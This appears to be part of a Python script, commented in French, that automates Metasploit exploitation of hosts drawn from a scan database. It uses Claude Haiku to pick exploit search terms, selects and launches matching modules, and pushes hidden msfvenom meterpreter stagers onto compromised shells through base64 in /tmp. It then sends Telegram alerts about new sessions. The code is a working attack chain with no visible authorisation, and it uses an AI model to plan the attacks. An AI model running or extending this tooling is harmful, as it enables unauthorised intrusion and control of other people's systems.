def filter_exploits_by_profile(exploits, allowed_patterns, os_name=''):
    """Filtre les exploits par profil service ET par OS de la cible."""
    if not allowed_patterns:
        return exploits
    os_paths = get_os_paths(os_name)
    print(f"[PROFIL] OS cible: '{os_name}' → chemins: {os_paths}")
    filtered = [
        mod for mod in exploits
        if any(p in mod.get('fullname', '').lower() for p in allowed_patterns)
        and any(p in mod.get('fullname', '').lower() for p in os_paths)
    ]
    print(f"[PROFIL] {len(exploits)} → {len(filtered)} exploits après filtrage profil+OS")
    return filtered


def get_host_services_by_address(address):
    """Récupère les services ouverts pour une IP depuis msf.services."""
    try:
        with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD, host=PG_HOST, port=PG_PORT) as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "SELECT s.port, s.name, s.info FROM services s "
                    "JOIN hosts h ON h.id = s.host_id "
                    "WHERE host(h.address::inet) = %s AND s.state = 'open';",
                    (str(address),)
                )
                return cur.fetchall()
    except psycopg2.Error as e:
        print(f"[ERREUR] Récupération services {address}: {e}")
        return []


def extract_search_terms_via_ai(services):
    """Utilise Claude uniquement pour les services dont le produit n'est pas couvert par le mapping statique."""
    if not _anthropic_sdk:
        return set()
    api_key = os.getenv("ANTHROPIC_API_KEY") or read_secret("anthropic_api_key")
    if not api_key:
        return set()

    # Termes déjà couverts par le mapping statique
    covered_terms = set()
    for port, svc_name, *_ in services:
        svc = (svc_name or '').lower()
        if svc in SERVICE_EXPLOIT_MAP:
            covered_terms.update(t.lower() for t in SERVICE_EXPLOIT_MAP[svc])
        elif port in PORT_SERVICE_MAP:
            mapped = PORT_SERVICE_MAP[port]
            if mapped in SERVICE_EXPLOIT_MAP:
                covered_terms.update(t.lower() for t in SERVICE_EXPLOIT_MAP[mapped])

    # Ne garder que les services dont le 1er mot de info n'est pas déjà couvert
    unmapped = []
    for port, name, info in services:
        if not info or not info.strip():
            continue
        first_word = re.split(r'[\s/(]', info.strip().lower())[0]
        if not first_word or len(first_word) < 3:
            continue
        already = any(first_word.startswith(t) or t.startswith(first_word) for t in covered_terms)
        if not already:
            unmapped.append({"port": port, "name": name or "", "info": info})

    if not unmapped:
        print("[AI] Tous les services couverts par le mapping statique — skip")
        return set()

    print(f"[AI] {len(unmapped)} service(s) non couvert(s) → appel Claude Haiku")
    try:
        client = _anthropic_sdk.Anthropic(api_key=api_key)
        response = client.messages.create(
            model="claude-haiku-4-5",
            max_tokens=256,
            messages=[{
                "role": "user",
                "content": (
                    "Extract Metasploit module search terms from these network services.\n"
                    "Return only product/software names that match MSF exploit module names.\n"
                    f"Services:\n{json.dumps(unmapped, indent=2)}\n"
                    'Return JSON: {"search_terms": ["term1", "term2", ...]}\n'
                    "Examples: vsftpd, proftpd, distcc, bind, postfix"
                )
            }],
            output_config={"format": {
                "type": "json_schema",
                "schema": {
                    "type": "object",
                    "properties": {
                        "search_terms": {"type": "array", "items": {"type": "string"}}
                    },
                    "required": ["search_terms"],
                    "additionalProperties": False
                }
            }}
        )
        data = json.loads(response.content[0].text)
        terms = set(t.lower() for t in data.get("search_terms", []))
        print(f"[AI] Termes extraits: {sorted(terms)}")
        return terms
    except Exception as e:
        print(f"[AI] Extraction échouée: {e}")
        return set()


def build_targeted_exploits(client, services, os_name='', products=None, scan_details=None):
    """
    Construit une liste d'exploits ciblés basée sur les services découverts.
    Si products (depuis bm12_v3 scan_details) est fourni, utilisé en priorité.
    attack_surface (depuis bm12 detect_vuln_indicators) enrichit les termes de recherche.
    Retourne une liste dédupliquée de modules exploit.
    """
    search_terms = set()

    # Priorité : produits identifiés par bm12_v3
    if products:
        for p in products:
            name = (p.get('name') or '').lower().strip()
            if name and len(name) >= 3:
                search_terms.add(name)
        print(f"[PROD] Termes depuis bm12_v3 products: {sorted(search_terms)}")

    # Termes depuis attack_surface bm12 (VulnHub indicators)
    attack_surface = (scan_details or {}).get('attack_surface', [])
    if attack_surface:
        as_terms = set()
        for indicator in attack_surface:
            vuln_name = indicator.get('vuln', '')
            for term in _VULN_EXPLOIT_TERMS.get(vuln_name, []):
                as_terms.add(term)
        if as_terms:
            print(f"[VULN] Termes depuis attack_surface: {sorted(as_terms)}")
            search_terms.update(as_terms)

    # Fallback : mapping statique service → termes si aucun produit
    if not search_terms:
        for port, svc_name, *_ in services:
            svc = (svc_name or '').lower()
            if svc in SERVICE_EXPLOIT_MAP:
                for term in SERVICE_EXPLOIT_MAP[svc]:
                    search_terms.add(term)
            elif port in PORT_SERVICE_MAP:
                mapped = PORT_SERVICE_MAP[port]
                if mapped in SERVICE_EXPLOIT_MAP:
                    for term in SERVICE_EXPLOIT_MAP[mapped]:
                        search_terms.add(term)

        # Enrichissement IA uniquement si pas de produits bm12
        ai_terms = extract_search_terms_via_ai(services)
        search_terms.update(ai_terms)

    if not search_terms:
        print("[WARN] Aucun service mappé, fallback sur 'linux'")
        search_terms = {'linux'}

    print(f"[INFO] Termes de recherche: {sorted(search_terms)}")

    seen = set()
    exploits = []
    for term in sorted(search_terms):
        for mod in client.modules.search(term):
            name = mod.get('fullname', '')
            if name and name not in seen:
                seen.add(name)
                exploits.append(mod)

    # Filtrage par profil serveur + OS de la cible
    profile_patterns = build_profile_filter(services)
    exploits = filter_exploits_by_profile(exploits, profile_patterns, os_name)

    print(f"[INFO] {len(exploits)} exploits uniques pour les services découverts")
    return exploits


def get_all_debug_hosts():
    """Sélectionne un hôte classifié par bm12_v3 avec des produits identifiés."""
    try:
        with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD, host=PG_HOST, port=PG_PORT) as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "SELECT id, address, scan_details FROM hosts TABLESAMPLE SYSTEM(0.5) "
                    "WHERE scan_status = 'bm12_v3' "
                    "AND scan_details IS NOT NULL "
                    "AND (scan_details::jsonb) ? 'products' "
                    "AND host(address::inet) NOT LIKE 'fe80:%%' "
                    "LIMIT 1;"
                )
                return cur.fetchall()
    except psycopg2.Error as e:
        print(f"[ERREUR] get_all_debug_hosts: {e}")
        return []



def kill_process_by_name(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
#        print(f"[INFO] Processus {proc.info['name']} (PID: {proc.info['pid']}) ...")
        if process_name in proc.info['name']:
            try:
                proc2kill = psutil.Process(proc.info['pid'])
                proc2kill.terminate()
                proc2kill.wait(timeout=3)
                print(f"[INFO] Processus {process_name} (PID: {proc.info['pid']}) terminé.")
            except psutil.NoSuchProcess:
                print(f"[ERREUR] Processus {process_name} n'existe plus.")
            except psutil.AccessDenied:
                print(f"[ERREUR] Accès refusé pour terminer le processus {process_name} (PID: {proc.info['pid']}).")
            except psutil.TimeoutExpired:
                print(f"[ERREUR] Temps d'attente expiré pour terminer le processus {process_name} (PID: {proc.info['pid']}).")
            return



def check_target(console, fullname, rhosts, rport):
    """Lance MSF check sur la cible. Retourne False si explicitement non vulnérable."""
    try:
        console.read()  # vider buffer
        cmds = f"use {fullname}\nset RHOSTS {rhosts}\n"
        if rport:
            cmds += f"set RPORT {rport}\n"
        cmds += "check\n"
        console.write(cmds)
        for _ in range(15):
            time.sleep(1)
            if not console.is_busy():
                break
        data = console.read()['data'].lower()
        if any(s in data for s in ['not exploitable', 'not vulnerable', 'safe', 'does not appear', 'cannot exploit']):
            return False
        return True
    except Exception:
        return True  # en cas d'erreur, procéder quand même


def upgrade_to_meterpreter(client, sid, host, bind_port=None):
    """
    Upgrade une shell session en meterpreter via bind_tcp.
    Pas de LHOST requis — le container se connecte AU target (bind, pas reverse).
    """
    if bind_port is None:
        bind_port = BIND_PORT

    print(f"\n[UPGRADE] Session {sid} ({host}) → meterpreter (bind_tcp:{bind_port})...")

    c = client.consoles.console()
    c.read()

    def shell_cmd(cmd):
        c.write(f'sessions -c "{cmd}" -i {sid}\n')
        for _ in range(6):
            time.sleep(1.5)
            out = c.read()['data']
            if not c.is_busy():
                return out
        return c.read()['data']

    # 1. Détecter l'architecture
    arch = 'x86'
    out = shell_cmd('uname -m')
    if 'x86_64' in out or 'amd64' in out:
        arch = 'x64'
    elif 'aarch64' in out or 'arm64' in out:
        arch = 'aarch64'
    elif 'arm' in out:
        arch = 'armle'
    elif 'mips' in out:
        arch = 'mipsle'
    print(f"[UPGRADE] Arch détectée: {arch}")

    payload = f'linux/{arch}/meterpreter/bind_tcp'
    elf_path = f'/tmp/.uzi_{sid}'

    # 2. Générer le stager avec msfvenom
    result = subprocess.run(
        ['/opt/metasploit/msfvenom', '-p', payload,
         f'LPORT={bind_port}', '-f', 'elf', '-o', elf_path],
        capture_output=True
    )
    if not os.path.exists(elf_path):
        print(f"[UPGRADE] msfvenom échoué: {result.stderr.decode()[:200]}")
        return None

    # 3. Injecter via la session shell (base64 → décode → exécute)
    with open(elf_path, 'rb') as f:
        b64 = base64.b64encode(f.read()).decode()
    os.unlink(elf_path)

    remote_b64 = f'/tmp/.p{sid}'
    remote_elf = f'/tmp/.m{sid}'

    # Nettoyer tout stager précédent sur ce port (évite "address already in use")
    shell_cmd(f'fuser -k {bind_port}/tcp 2>/dev/null; pkill -9 -f {remote_elf} 2>/dev/null; rm -f {remote_b64} {remote_elf}; true')
    time.sleep(1)

    shell_cmd(f'printf "{b64}" > {remote_b64}')
    shell_cmd(f'base64 -d {remote_b64} > {remote_elf} && chmod +x {remote_elf} && {remote_elf} &')
    time.sleep(3)

    # 4. Démarrer le handler bind_tcp (se connecte AU target)
    known = set(client.sessions.list.keys())
    h = client.consoles.console()
    h.read()
    for cmd in [
        'use exploit/multi/handler',
        f'set PAYLOAD {payload}',
        f'set LPORT {bind_port}',
        f'set RHOST {host}',
        'set ExitOnSession false',
        'run -j',
    ]:
        h.write(cmd + '\n')
        time.sleep(0.5)

    # 5. Attendre la session meterpreter
    for _ in range(20):
        time.sleep(2)
        h.read()
        new = {k: v for k, v in client.sessions.list.items()
               if k not in known and v.get('type') == 'meterpreter'}
        if new:
            msid = list(new.keys())[0]
            info = new[msid]
            print(f"[UPGRADE] Meterpreter session {msid} — "
                  f"{info.get('platform')}/{info.get('arch')} as {info.get('username')}")
            enriched = dict(info)
            try:
                msf_session = client.sessions.session(msid)
                enriched['_sysinfo'] = (msf_session.run_with_output('sysinfo', timeout=10) or '').strip()
                enriched['_getuid'] = (msf_session.run_with_output('getuid', timeout=10) or '').strip()
                enriched['_getpid'] = (msf_session.run_with_output('getpid', timeout=10) or '').strip()
            except Exception as e:
                print(f"[UPGRADE] Enrichissement session échoué: {e}")
            report_note(host, enriched)
            send_telegram_alert({msid: enriched}, host)
            return msid

    print("[UPGRADE] Timeout — upgrade échoué")
    return None


def handle_new_sessions(client, sessions, upgraded_sessions, host):
    """Upgrade les nouvelles shell sessions, alerte Telegram uniquement sur nouvelles sessions."""
    new_shells = {k: v for k, v in sessions.items()
                  if k not in upgraded_sessions and v.get('type') == 'shell'}
    for sid, info in new_shells.items():
        upgraded_sessions.add(sid)
        msid = upgrade_to_meterpreter(client, sid, info.get('session_host', str(host)))
        if msid:
            upgraded_sessions.add(msid)

    current = client.sessions.list
    if current:
        print(f"[SESSION] {len(current)} session(s) actives: {list(current.keys())}")
    if new_shells:
        send_telegram_alert(new_shells, str(host))


# Boucle principale
def main():
